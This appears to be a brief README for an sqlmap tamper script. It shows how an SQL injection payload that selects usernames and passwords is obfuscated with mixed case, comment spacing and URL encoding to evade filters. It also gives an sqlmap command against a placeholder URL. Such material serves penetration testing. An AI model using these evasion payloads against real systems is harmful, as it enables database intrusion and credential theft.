## SQLmap-Tamper-Scipts

### Example Payload Transformations
Input Payload: SELECT username, password FROM users WHERE id=1 AND admin=1;
Output Payload (Transformed): sElEcT/**/username,/**/password/**/FrOm/**/users/**/wHeRe/**/id%3D1/**/&&/**/admin%3D1%3B
### How to Use
Save this script as advanced_obfuscation.py in the sqlmap/tamper directory.
### Run SQLMap with the tamper script:
sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper=advanced_obfuscation

